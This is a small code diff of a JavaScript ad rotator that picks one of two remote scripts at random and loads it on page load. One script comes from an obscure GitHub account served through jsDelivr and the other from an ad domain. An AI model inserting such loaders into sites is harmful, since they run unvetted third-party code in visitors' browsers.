@@ -1,6 +1,6 @@
-﻿<script type="text/javascript">
 var randoms = {
-	ads_codes: ['document.writeln("<script type=\\\'text/javascript\\\' src=\\\'https://cdn.jsdelivr.net/gh/xzsfaf15618a/adress/today.js\\\'><'+'/script>");','document.writeln("<script type=\\\'text/javascript\\\' src=\\\'https://mm3.mylmad.com/ad/content/120\\\'><'+'/script>");'],
+	ads_codes: ['<script type=\'text/javascript\' src=\'https://mm3.mylmad.com/ad/content/120\'><'+'/script>',
+'<script type=\'text/javascript\' src=\'https://cdn.jsdelivr.net/gh/xzsfaf15618a/adress/today.js\'><'+'/script>'],
 	ads_weight: [10,10],
 
 	get_random: function(weight) {
@@ -19,4 +19,3 @@ var randoms = {
 	}
 }
 randoms.init();
-</script>
